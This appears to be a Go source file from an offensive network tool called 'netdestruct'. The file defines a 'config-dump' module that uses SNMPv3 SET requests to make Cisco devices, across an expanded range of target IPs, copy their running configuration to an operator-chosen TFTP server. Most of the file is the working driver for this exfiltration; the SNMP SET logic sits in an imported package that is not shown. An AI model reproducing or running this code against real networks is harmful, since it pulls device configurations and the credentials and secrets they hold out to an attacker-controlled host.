package snmp

import (
	"fmt"
	"io"
	"net"
	"os"
	"strings"

	snmpenum "netdestruct/libs/enumeration/snmp"
)

const (
	defaultPort = 161
)

// ConfigDumper triggers a Cisco running-config copy to TFTP via SNMPv3.
type ConfigDumper struct {
	Target     string
	Port       int
	TFTPServer string
	Username   string
	Auth       string // optional: MD5|SHA|SHA-224|SHA-256|SHA-384|SHA-512
	AuthPass   string // required if Auth is set
	Priv       string // optional: DES|AES|AES-192|AES-256
	PrivPass   string // required if Priv is set
	Out        io.Writer
}

// Run discovers the SNMP engine, issues CISCO-CONFIG-COPY-MIB SETs, and reports the TFTP filename.
func (d *ConfigDumper) Run() error {
	target := strings.TrimSpace(d.Target)
	tftp := strings.TrimSpace(d.TFTPServer)
	user := strings.TrimSpace(d.Username)
	auth := strings.TrimSpace(d.Auth)
	authPass := strings.TrimSpace(d.AuthPass)
	priv := strings.TrimSpace(d.Priv)
	privPass := strings.TrimSpace(d.PrivPass)
	if target == "" {
		return fmt.Errorf("--snmp --config-dump requires --target <ip>")
	}
	if tftp == "" {
		return fmt.Errorf("--snmp --config-dump requires --tftp-server <ip>")
	}
	if user == "" {
		return fmt.Errorf("--snmp --config-dump requires --username <user>")
	}
	if auth != "" && authPass == "" {
		return fmt.Errorf("--auth requires --auth-pass")
	}
	if authPass != "" && auth == "" {
		return fmt.Errorf("--auth-pass requires --auth")
	}
	if priv != "" && privPass == "" {
		return fmt.Errorf("--priv requires --priv-pass")
	}
	if privPass != "" && priv == "" {
		return fmt.Errorf("--priv-pass requires --priv")
	}
	if priv != "" && auth == "" {
		return fmt.Errorf("--priv requires --auth (privacy cannot be used without authentication)")
	}

	port := d.Port
	if port <= 0 {
		port = defaultPort
	}
	out := d.Out
	if out == nil {
		out = os.Stdout
	}

	targets, err := snmpenum.ExpandTargets(target)
	if err != nil {
		return err
	}

	tftpIP := net.ParseIP(tftp)
	if tftpIP == nil {
		addrs, err := net.LookupIP(tftp)
		if err != nil || len(addrs) == 0 {
			return fmt.Errorf("resolve --tftp-server %q: %w", tftp, err)
		}
		tftpIP = addrs[0]
	}

	secLevel := "noAuthNoPriv"
	authLabel := "none"
	privLabel := "none"
	switch {
	case auth != "" && priv != "":
		secLevel = "authPriv"
		authLabel = strings.ToUpper(auth)
		privLabel = strings.ToUpper(priv)
	case auth != "":
		secLevel = "authNoPriv"
		authLabel = strings.ToUpper(auth)
	}

	fmt.Fprintf(out, "%s Mode: config-dump  Version: SNMPv3 %s  Port: %d\n",
		snmpenum.SNMPTag(), secLevel, port)
	fmt.Fprintf(out, "%s Auth: %s  Priv: %s  User: %s  TFTP: %s\n",
		snmpenum.SNMPTag(), authLabel, privLabel, user, tftpIP)

	var failed int
	for _, ip := range targets {
		fileName, err := snmpenum.TriggerCiscoConfigCopy(
			ip.String(), port, user, auth, authPass, priv, privPass, tftpIP.String(),
		)
		if err != nil {
			failed++
			fmt.Fprintf(out, "%s config-dump failed for %s: %v\n", snmpenum.SNMPTag(), ip, err)
			continue
		}
		fmt.Fprintf(out, "\x1b[32m[+]\x1b[0m Triggered config copy from %s → TFTP %s as %s\n",
			ip, tftpIP, fileName)
		fmt.Fprintf(out, "%s Ensure a TFTP server is listening on %s:69; file may appear as %s\n",
			snmpenum.SNMPTag(), tftpIP, fileName)
	}
	if failed > 0 {
		return fmt.Errorf("config-dump failed for %d of %d target(s)", failed, len(targets))
	}
	return nil
}
